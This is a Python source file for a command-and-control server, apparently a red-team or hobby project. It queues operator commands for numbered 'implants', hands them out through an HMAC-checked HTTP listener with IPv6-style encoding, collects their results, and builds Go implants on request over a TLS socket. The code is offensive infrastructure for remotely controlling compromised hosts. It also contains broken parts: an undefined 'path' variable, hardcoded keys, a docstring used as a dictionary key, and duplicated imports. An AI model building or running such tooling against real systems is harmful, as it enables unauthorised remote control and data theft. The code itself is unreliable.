import json
import hashlib
import hmac
import signal

from twisted.web.http import urlparse
from twisted.web.server import Site
from twisted.web.resource import Resource
from twisted.internet import reactor, defer
from twisted.web import http
import hashlib
import hmac
import json
import logging
import os
import socket
import ssl
import subprocess
import threading
import time
from queue import Queue, Empty
from threading import Thread
import secrets

from flask import Flask, request, jsonify

import ipv6_encoder
import pw_hash

app = Flask(__name__)
implant_checkout = {}

operator_session_tokens = set()

# Command queues for each implant identified by a 4-digit ID
implant_command_queues = {
    "1234": Queue(),
    "5678": Queue(),
}

# Result storage for each user
# Keeping this as a nested dict for now
result_storage = {
    """
    This is a nested dict for now
    The intention is that a user will interact with multiple implants
    Then to get the results from individual implants, they search for the implant key
    The value they get is the first element which can then be popped to move others up
    """
    "tester": [],
    "matt_tester": [],
}

# Logger configuration
logger = logging.getLogger(__name__)
logging.basicConfig(
    filename='server.log',
    level=logging.DEBUG,
    format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
)


def verify_auth_token(uri, received_token, received_timestamp):
    """
    Verifies HMAC auth tokens sent by clients to confirm authorization
    :param uri: The URI that the request came to
    :param received_token: The HMAC token sent with the request
    :param received_timestamp: The timestamp that the token was sent
    :return: bool depending on comparison outcome
    """
    secret_key = "4321"
    time_window = 60  # Allow a 60-second window for token validity
    # Ensure the timestamp is within the allowed time window
    current_time = int(time.time())
    if abs(current_time - int(received_timestamp)) > time_window:
        logger.error("token past time window")
        return False

    # Recalculate the HMAC based on the URI and timestamp
    message = f"{uri}:{received_timestamp}"
    hmac_obj = hmac.new(secret_key.encode(), message.encode(), hashlib.sha256)
    computed_token = hmac_obj.hexdigest()

    # Verify the token
    return hmac.compare_digest(computed_token, received_token)


def build_implant(protocol):
    """
    Builds an implant for the selected protocol
    :param protocol: The protocol to communicate over
    :return: bool depending on build success
    """
    match protocol:
        case "http":
            try:
                os.chdir("./implant")
                subprocess.run(["go", "build", "-tags", "http", "./http"], check=True, capture_output=True, text=True)
                return True
            except subprocess.CalledProcessError as e:
                logger.error(f"error building: {e}")
                return False
            except Exception as e:
                logger.error(f"general exception occurred: {e}")
                return False


def add_user(new_user_id):
    """
    Adds a new user to the result storage dict
    :param new_user_id: The users ID to add
    :return: Nothing
    """
    logger.info(f"adding new user {new_user_id}")
    result_storage.setdefault(new_user_id, [])


def add_command(implant_id, operator, command):
    """
    Add a command to the implants queue
    :param implant_id: The implant ID to send the command to
    :param operator: The operator who set the command
    :param command: The command itself to be run
    :return: Nothing
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        queue.put((operator, command))
        logger.info(f"Added command for implant {implant_id}: {command}")
    else:
        logger.error(f"No queue found for implant {implant_id}, creating one")
        implant_command_queues.setdefault(implant_id, Queue())
        implant_command_queues[implant_id].put(command)
        logger.info(f"Added command for implant {implant_id}: {command}")


def get_results(user_id):
    """
    Get the users result storage
    :param user_id: The user ID to get the storage for
    :return: The results if any
    """
    fetched = str(result_storage.get(user_id, []))
    logger.info(f"got results {fetched}")
    result_storage.pop(user_id, 0)
    return fetched


def get_waiting_command(implant_id):
    """
    Gets the oldest command waiting in the implants queue
    :param implant_id: The implant ID to get the queue for
    :return: Either the operator name who set it and the command or False/False
    """
    queue = implant_command_queues.get(implant_id)
    if queue:
        try:
            operator, command = queue.get()
            logger.info(f"Fetched command for implant {implant_id}: Operator={operator}, Command={command}")
            return operator, command
        except Empty:
            logger.info(f"No commands available for {implant_id}")
            return False, False
    else:
        logger.info(f"No queue found for {implant_id}")
        return False, False


def handle_update(uname, implant_id, result):
    """
    Handle implants sending results of commands to the server
    :param uname: The user who should get the results
    :param implant_id: The implant ID associated with the command
    :param result: The result sent by the implant
    :return: Boolean: True if success, otherwise returns error
    """
    try:
        # decoded_res = ipv6_encoder.ipv6_to_string(result)
        logger.info(f"first 10 bytes {result[:10]}")
        dict_store = {implant_id: result}
        result_storage.setdefault(uname, []).append(dict_store)
        logger.info(f"new result saved for user: {uname}")
        return True
    except Exception as e:
        logger.error(f"error occurred saving result for implant: {e}")
        return e


def checkout_command(imp_id, user_id):
    """
    Creates a queue that has the implant ID as the key and adds the user to it
    Informs the server who needs the latest result
    :param imp_id: The ID for the implant
    :param user_id: The ID for the user who sent the command
    :return:
    """
    implant_checkout.setdefault(imp_id, Queue())
    implant_checkout[imp_id].put(user_id)


def handle_client(client_socket):
    """
    Handles the client sending and retrieving info
    :param client_socket: The socket object the client uses to connect
    :return: Uses the client socket to send data, function returns nothing
    """
    try:
        # Receive the client's initial message
        client_request = client_socket.recv(1024).decode()

        # Check what type of message it is first before processing further
        request_type, *remainder = client_request.split(" ", 1)

        match request_type:
            case "AUTH":
                logger.info("authenticating user")
                request_type, uname, passwd = client_request.split(" ", 2)
                logger.info(f"checking authentication details for {uname}")
                if pw_hash.compare_hash(uname, passwd):
                    logger.info("user authenticated, generating session token")
                    returned_token = secrets.token_hex()
                    client_socket.send(returned_token.encode())
                    operator_session_tokens.add(returned_token)
                else:
                    client_socket.send("Bad username or password\n".encode())

            case "PUB":
                logger.info("request to send command, attempting")
                request_type, implant_id, uname, token, *command = client_request.split(" ", 4)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    command = command[0] if command else ""
                    add_command(implant_id, uname, command)
                    client_socket.send("Command queued\n".encode())
                    logger.info(f"Command: {command} added to queue for implant: {implant_id}")
                else:
                    logger.error("bad token")
                    client_socket.send("Bad token\n".encode())

            case "RTR":
                logger.info("controller requesting implant last messages")
                request_type, uname, token, *message = client_request.split(" ", 3)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    results = get_results(uname)
                    client_socket.send(results.encode())
                    logger.info(f"sent controller results {results}")
                else:
                    client_socket.send(f"Bad token\n".encode())
                    logger.error("bad token")

            case "BLD":
                logger.info("controller building new implant")
                request_type, uname, token, *message = client_request.split(" ", 3)
                logger.info(f"checking session token")
                if token in operator_session_tokens:
                    bld_status = build_implant(message)
                    if bld_status is True:
                        client_socket.send("Building implant succeeded!")
                    else:
                        client_socket.send("Building implant failed...")
                else:
                    client_socket.send(f"Bad token\n".encode())
                    logger.error("bad token")

            case _:
                logger.error(f"unknown command: {request_type}")
                client_socket.send("Unknown command\n".encode())

    except Exception as e:
        logger.error(f"Error occurred when trying to receive connection {e}")
    finally:
        client_socket.close()


class AuthenticatedListener(Resource):
    isLeaf = True  # This resource will handle the GET requests directly

    def render_GET(self, twisted_req):
        # Parse the path segment after "/auth/"

        print(path)
        rcv_token = twisted_req.args.get(b"token", [None])[0]
        rcv_timestamp = twisted_req.args.get(b"timestamp", [None])[0]

        # Log the request
        logger.info("GET incoming for authenticated listener URI")

        # Verify token
        if verify_auth_token(path, rcv_token, rcv_timestamp):
            try:
                operator, command = get_waiting_command(path)
                if operator and command is False:
                    logger.error("Operator and command in queue returned as false")
                    twisted_req.setResponseCode(http.INTERNAL_SERVER_ERROR)
                    return b"error"

                checkout_command(path, operator)
                command_json = json.dumps(ipv6_encoder.string_to_ipv6(command))
                logger.info("sending command and HMAC to implant")

                # Generate HMAC
                hmac_k = hmac.new(b"1234", command_json.encode(), hashlib.sha256)
                hmac_sig = hmac_k.hexdigest()

                # Prepare JSON response
                response_data = {
                    "message": command_json,
                    "key": hmac_sig
                }
                response_json = json.dumps(response_data)

                # Set headers and return response
                twisted_req.setHeader(b"Content-Type", b"application/json")
                return response_json.encode()

            except Exception as e:
                logger.error(f"Error: {e}")
                twisted_req.setResponseCode(http.INTERNAL_SERVER_ERROR)
                return b"error"
        else:
            logger.error("Error: verify_auth_token failed")
            twisted_req.setResponseCode(http.UNAUTHORIZED)
            return b"error"


# Function to start the Twisted server in a separate thread
def start_twisted():
    root = Resource()
    root.putChild(b"auth", AuthenticatedListener())
    factory = Site(root)
    reactor.listenTCP(5000, factory)
    reactor.run(installSignalHandlers=False)  # Avoid blocking signal handling


# Socket server setup
def start_socket_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 9999))  # Bind to any available interface
    server.listen(5)
    server_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    server_context.minimum_version = ssl.TLSVersion.TLSv1_3
    server_context.maximum_version = ssl.TLSVersion.TLSv1_3
    server_context.load_cert_chain(certfile="server.pem")
    server_context.verify_mode = ssl.CERT_NONE
    secure_socket = server_context.wrap_socket(server, server_side=True)
    logger.info("TLS socket wrapped and starting on port 9999\n")

    while True:
        client_socket, addr = secure_socket.accept()
        logger.info(f"Accepted connection from: {addr}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()


# Function to start both servers
def start_server():
    # Start Twisted in a separate thread
    twisted_thread = Thread(target=start_twisted)
    twisted_thread.start()

    # Start the socket server in the main thread
    start_socket_server()


if __name__ == "__main__":
    start_server()
